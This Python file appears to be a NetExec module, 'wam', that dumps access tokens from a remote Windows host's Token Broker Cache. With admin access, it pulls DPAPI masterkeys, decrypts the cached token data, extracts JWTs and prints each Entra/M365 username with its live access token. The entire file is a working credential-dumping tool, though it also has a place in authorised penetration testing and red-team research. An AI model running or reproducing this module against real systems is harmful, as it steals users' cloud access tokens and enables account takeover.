import re
import jwt
from dploot.triage.wam import WamTriage

from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "wam"
    description = "Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx"
    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No options available"""

    def on_admin_login(self, context, connection):
        self.masterkeys = connection.dpapi_triage.collect_masterkeys_from_target(dump_users=True, dump_system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success("Looting Token Broker Cache access tokens")

        def token_callback(token):
            for attrib in token.attribs:
                if attrib["Key"].decode() == "WTRes_Token":
                    # Extract every access token
                    for access_token in re.findall(r"e[yw][A-Za-z0-9-_]+\.(?:e[yw][A-Za-z0-9-_]+)?\.[A-Za-z0-9-_]{2,}(?:(?:\.[A-Za-z0-9-_]{2,}){2})?", attrib.__str__()):
                        decoded_token = jwt.decode(access_token, options={"verify_signature": False})
                        if "preferred_username" in decoded_token:
                            # Assuming that if there is no preferred_username key, this is not a valid Entra/M365 Access Token
                            context.log.highlight(f"[{token.winuser}] {decoded_token['preferred_username']}: {access_token}")

        try:
            triage = WamTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=self.masterkeys, per_token_callback=token_callback)
            triage.triage_wam()
        except Exception as e:
            context.log.debug(f"Could not loot access tokens: {e}")
